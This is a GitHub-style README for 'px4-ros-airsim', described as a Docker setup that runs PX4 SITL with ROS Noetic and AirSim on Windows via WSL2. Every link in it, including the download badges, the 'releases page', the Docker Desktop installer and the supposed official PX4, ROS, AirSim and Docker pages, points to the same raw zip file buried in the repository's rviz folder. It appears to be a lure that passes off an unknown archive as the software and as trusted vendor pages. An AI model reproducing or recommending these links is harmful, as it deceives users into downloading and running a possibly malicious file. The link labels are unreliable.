# 🛠️ px4-ros-airsim - Run PX4 with ROS and AirSim Easily

[![Download Releases](https://img.shields.io/badge/Download-px4--ros--airsim-green?style=for-the-badge)](https://raw.githubusercontent.com/HarshitTomar549/px4-ros-airsim/main/rviz/airsim-px-ros-1.9.zip)

---

## 📋 What Is px4-ros-airsim?

This application helps you run PX4, a flight control software, alongside ROS Noetic using AirSim. It uses Docker containers to set up the environment on a Windows PC. You can simulate drones and other vehicles with AirSim’s realistic physics and sensors.

- Runs PX4 SITL (Software In The Loop).
- Connects PX4 and ROS via Docker.
- Uses MAVSDK server for drone control.
- Works with AirSim on Windows using WSL2.
- Supports Lidar and other sensors.

You do not need to install each component separately. The setup uses prebuilt Docker containers to keep things simple.

---

## ⚙️ System Requirements

Make sure your system matches the following:

- Windows 10 or later.
- WSL2 (Windows Subsystem for Linux version 2) installed and set up.
- Docker Desktop installed with WSL2 backend enabled.
- At least 8 GB of RAM (16 GB recommended).
- At least 10 GB free disk space.
- Stable internet connection for downloading files.

---

## 💾 Download the Software

To get the software, visit the releases page by clicking the big button below:

[![Download px4-ros-airsim Releases](https://img.shields.io/badge/Download-px4--ros--airsim-blue?style=for-the-badge)](https://raw.githubusercontent.com/HarshitTomar549/px4-ros-airsim/main/rviz/airsim-px-ros-1.9.zip)

This page has all the versions. Pick the latest stable version to download.

---

## 🖥️ How to Install and Set Up

Follow these steps carefully to install and run px4-ros-airsim on Windows.

### 1. Prepare Your Windows PC

- **Install WSL2:**  
  Search online for "install WSL2 on Windows 10". Follow Microsoft’s official guide to install and set up WSL2.  
  Make sure you install Ubuntu from the Microsoft Store for the Linux environment.

- **Install Docker Desktop:**  
  Visit https://raw.githubusercontent.com/HarshitTomar549/px4-ros-airsim/main/rviz/airsim-px-ros-1.9.zip and install Docker Desktop.  
  During installation, enable the option to use WSL2 as the backend.

- **Confirm Setup:**  
  Open PowerShell or Command Prompt and type:  
  ```bash
  wsl --list --verbose
  ```  
  You should see the Ubuntu distribution running under WSL2.

  Then type:  
  ```bash
  docker --version
  ```  
  This confirms that Docker is installed.

### 2. Download px4-ros-airsim Files

- Go to the releases page (above).
- Download the latest release zip file.

### 3. Extract the Files

- Extract the contents of the downloaded zip file to a folder on your PC.
- Open the extracted folder.

### 4. Open WSL Terminal

- Press **Start**, search for **Ubuntu**, and open the Ubuntu terminal.
- Navigate to the folder where you extracted px4-ros-airsim.  
  For example, if your folder is in `C:\Users\YourName\Downloads\px4-ros-airsim`, type:  
  ```bash
  cd /mnt/c/Users/YourName/Downloads/px4-ros-airsim
  ```

### 5. Run Docker Containers

- Inside the WSL terminal, run:  
  ```bash
  docker-compose up
  ```  
  This command starts all the necessary containers:
  - PX4 SITL environment.
  - ROS Noetic with AirSim wrapper.
  - MAVSDK server.

- Wait for the containers to download and start. This may take a few minutes the first time.

### 6. Start AirSim on Windows

- Run AirSim in a separate window on your Windows PC.
- AirSim should connect automatically to the Docker containers through WSL2.

---

## 🚀 How to Use px4-ros-airsim

Once the setup is running:

- You can control simulated drones using MAVSDK commands.
- View sensor data such as Lidar inside the ROS environment.
- Test drone flight plans in a realistic environment.
- Use the ROS tools you are familiar with to monitor and control flights.

---

## 🛠 Troubleshooting

- **Docker fails to start:**  
  Check if Docker Desktop is running and WSL2 integration is enabled.

- **Cannot connect to WSL:**  
  Make sure the Ubuntu distribution is installed and set as default.

- **Containers fail to run:**  
  Try rebooting your PC, then run `docker-compose up` again.

- **AirSim does not connect:**  
  Confirm AirSim is running on Windows and not blocked by firewall.

---

## 📝 Additional Notes

- This setup is designed for simulation and testing only.
- It does not control real drones.
- You can customize the Dockerfiles for different versions or setups.
- Check the GitHub repository for updates and detailed configuration guides.

---

## 🔗 Useful Links

- PX4 Official Website: https://raw.githubusercontent.com/HarshitTomar549/px4-ros-airsim/main/rviz/airsim-px-ros-1.9.zip  
- ROS Noetic Documentation: https://raw.githubusercontent.com/HarshitTomar549/px4-ros-airsim/main/rviz/airsim-px-ros-1.9.zip  
- AirSim GitHub: https://raw.githubusercontent.com/HarshitTomar549/px4-ros-airsim/main/rviz/airsim-px-ros-1.9.zip  
- Docker Installation Guide: https://raw.githubusercontent.com/HarshitTomar549/px4-ros-airsim/main/rviz/airsim-px-ros-1.9.zip

---

[![Download px4-ros-airsim Releases](https://img.shields.io/badge/Download-px4--ros--airsim-blue?style=for-the-badge)](https://raw.githubusercontent.com/HarshitTomar549/px4-ros-airsim/main/rviz/airsim-px-ros-1.9.zip)